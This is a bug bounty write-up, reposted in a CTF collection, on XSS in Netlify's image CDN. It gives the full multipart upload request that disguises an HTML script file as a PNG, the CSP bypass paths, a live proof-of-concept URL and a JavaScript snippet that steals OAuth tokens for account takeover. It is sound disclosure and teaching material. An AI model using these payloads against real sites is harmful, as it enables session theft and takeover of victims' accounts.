# :globe_with_meridians: Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN

> **Original Source:** [Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN](https://infosecwriteups.com/bypassing-csp-via-url-parser-confusions-xss-on-netlifys-image-cdn-755a27065fd9)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN


Heyyy Everyonee,


In this blogpost I am going to talk about my finding which was a XSS on Netlify’s Image CDN used in [https://app.netlify.com](https://app.netlify.com) and how I managed to bypass this CSP `Content-Security-Policy: script-src ‘none’` (for those of you who aren’t much familiar with this CSP , in simple terms it means no script execution will be there in any case) along with that some other things which can be applied on other sites also which are using Netlify’s Image CDN , for those of you unfamiliar with what it is would recommend reading this article:


In short many popular Static Site Generators have this Image CDN functionality where they optimize the images used on the website. This is useful in cases where you want to make the site load faster by reducing the time taken for loading images as less as possible.


Some examples of this are:


All these have the same goal where they take a url as an input either via a parmeter or from the path and optimize the image. A lot of stuff goes behind the scene when you make a request to such endpoint, if you are interested luckily all of them are open source so you can take a deep dive and maybe find some cool bugs.


```
/_next/image?url=
/_gatsby/image/:url
/.netlify/image?url=
/_ipx/w_200/:url
```


Also you will find these endpoints will often have some checks in place like which url you are allowed to make requests to which is all configurable as per the docs. They aslo validate the Content-Type of the requested image, like `image/svg+xml` as it could allow xss and other checks to like checking the response buffer too , to make sure the requested image url is really is an image or not before serving the response back.


Some don’t do any checks for images and even allow you to serve html response via this endpoint, as the requested url is fetched server side not client side it can also be good candidate for SSRF (I am not just bluffing all these some cool hackers have proved all these things are possible) like they were able to bypass the domain check to make request to any url or get xss or even Full read SSRF


It’s a really interesting attack surface after seeing some awesome research done by Assetnote and Sam Curry in the past on this, I decided to look into them as well , so far have some interesting leads which I hope can be turned into a bug maybe. But well that’s a different topic if I did find something, will make sure to write a blog about it.


Enough background details now back to the finding,so sites built on Netlify has this Image Optimization endpoint


```
/.netlify/images?url=
```


An example url can be this: [https://app.netlify.com/.netlify/images?url=https://app.netlify.com/favicon.ico](https://app.netlify.com//.netlify/images?url=https%3A%2F%2Fapp.netlify.com%2Ffavicon.ico)


There are some more parameters which can also be used to return the image with a different width or height,etc. The url parameter only allows you to fetch files from whitelisted hosts only, this hosts can be configured via the netlify.toml file


```

[images]
remote_images = [
"https://my-images.com/.*",
"https://animals.more-images.com/[bcr]at/.*"]
```


By default the same origin urls are also accepted in the `url` parameter. You can see in the above config , it makes the use of regex also `.*`so even little mistakes can have some side effects there.


As earlier I told some providers don’t do any check on this whether the requested url returns a valid image or not this is in the case of Netlify.


So you can even do thing like this, here I am requesting the Index page, the response for the requested url is fetched server side (some weird thing can here happen too, maybe ssrf if the config allows making request to any url )


In case of [https://app.netlify.com](https://app.netlify.com) , the following CDN domain was in the whitelist [https://d33wubrfki0l68.cloudfront.net](https://d33wubrfki0l68.cloudfront.net). They use this CDN to host all the user uploaded contents such as profile picture,etc


I had this thought in my mind, if I could find arbitrary file upload on the CDN domain I could use that here in the `/.netlify/image?url` endpoint and get XSS ?


## Get Sudhanshu Rajbhar’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Indeed there was some checks to make sure the user can’t upload anything else but images. I tried SVG but it didn’t allowed it.


```
{"code":422,"message":"Logo must be an image"}
```


I found a bypass for this easily , which allowed me to upload any files to the cdn domain.
By setting the `Content-Type: image/png` mimetype for the uploaded file to be one of the whitelisted ones it allowed to bypass the check


```

POST /access-control/bb-api/api/v1/accounts/5d77dc9150223b44a44df1f3/logo HTTP/2
Host: app.netlify.com
Cookie: Redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------26024016321888288818835600843
Referer: https://app.netlify.com/teams/sudi/overview
Content-Length: 606
Origin: https://app.netlify.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

-----------------------------26024016321888288818835600843
Content-Disposition: form-data; name="file"; filename="xss.html"
Content-Type: image/png

<h1>shirley</h1><script>alert()</script>
-----------------------------26024016321888288818835600843--
```


```
{
"url": "https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html"
}
```


As you can see we recieved a successful response, with url which has the `.html` extension. Now let’s check the `Content-Type` of the response ..


And voilla we now have a working xss in the CDN domain, I thought now it would easy to get xss in the `/.netlify/images?url=` endpoint


But we hit a bummer!! Even though the `Content-Type` is `text/html` and the response body contains the xss payload it won’t trigger and is pretty useless due to the *CSP *being used.


```
Content-Security-Policy: script-src 'none'
```


This is the CSP which is being used in this endpoint, as I already mentioned this before it’s impossible to bypass this csp. It’s super strict, leaves no room for any bypasses.


I lost my hope and was about to give up. But next morning I had a random thought, I have been testing Netlify for a couple of days now so had a good idea about their application and all.


For other endpoints also they have CSP but it’s very relax , in simple terms that one is easy to bypass but this `/.netlify/images?url= `endpoint returned a different very strict CSP.


So on the backend side they must be checking the path of the requested url and serving a different CSP especially for it. Just an example nginx conf of how this might be happening


```
location /.netlify/images {
# Set Content Security Policy
add_header Content-Security-Policy "script-src 'none'";
```


What if there are any URL parsing confusion b/w the service responsible for serving CSP and the service related to fetching the resource. If this is true can I take advantage of it?


If I can provide a path such that it doesn’t matches with the `location `directive so nginx isn’t able to catch that but the backend service normalizes the path and treats it as `/.netlify/images `only so a proper response is returned which doesn’t have the strict CSP


I started playing with the path


```
GET /./.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&fit=cover&h=200&w=200&x=x HTTP/2
Host: app.netlify.com
```


Response:


```
HTTP/2 200 OK

Content-Security-Policy: script-src 'nonce-ak9jJ87J3kkfSFdbapb1h7sEJ/RjVtSQ' 'strict-dynamic' 'unsafe-inline' 'unsafe-eval' 'self' https: http: 'none'; report-uri /.netlify/functions/__csp-violations
Content-Type: text/html
```


Nice the theory really works, I was able to make it return a different CSP but with the same response. But `/./.netlify/images` if I use such a path in browser it would normalize the url to `/.netlify/images` before making the request to the sevrer


Then I tried some url encoding stuff /.netlify%2fimages and this worked perfectly fine I was able to get xss


Used a simple poc as this to leak the authorization code from the Github Oauth flow


```
x = window.open("https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&login=true&redirect=https://app.netlify.com/");

setInterval(function() {
console.log(x.location.href);
}, 500);
```


I could use this url with the `access_token`to login to victim’s account as the `access_token `in the query param is basically their` `main session cookie.


They tried fixing it but soon enough I found another bypass, by just adding a `/ `before the path I was able to bypass the CSP:


```
//.netlify/images
```


This bypass still works you can try playing with the endpoint here


[https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&fit=cover&h=200&w=200&x=x](https://app.netlify.com//.netlify/images?url=https%3A%2F%2Fd33wubrfki0l68.cloudfront.net%2F5d77dc9150223b44a44df1f3%2Fce5815cfceaaea304025%2Fxss.html&fit=cover&h=200&w=200&x=x)


The url is pointing to an old uploaded html file, Netlify fixed the issue by disallowing the upload of arbitrary files on their CDN Domain and left the url parser bug as it is. As you no longer have a way to upload arbitrary file which can lead to xss they consider this issue to be fixed ¯\_(ツ)_/¯


I hope you liked the writeup, next time you had to deal with a strict csp maybe try playing with the path and see if you can make the server return a relaxed csp or something which might be easier to bypass than the original one and you can get lucky like me :)

---

*Originally published on [Medium](https://infosecwriteups.com/bypassing-csp-via-url-parser-confusions-xss-on-netlifys-image-cdn-755a27065fd9). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
